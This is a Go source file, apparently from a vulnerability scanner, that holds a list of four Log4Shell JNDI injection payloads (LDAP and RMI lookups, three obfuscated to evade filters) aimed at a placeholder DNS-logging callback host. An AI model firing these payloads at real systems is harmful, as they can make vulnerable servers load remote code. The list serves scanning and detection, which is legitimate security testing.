package log4j

var (
	log4jJndiPayloads = []string{
		"${jndi:ldap://dnslog-url}",
		"${jndi:ldap:${::-/}${::-/}dnslog-url}",
		"${${X::-j}ndi:rmi:${::-/}${X::-/}dnslog-url}",
		"${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}dnslog-url}}",
	}
)
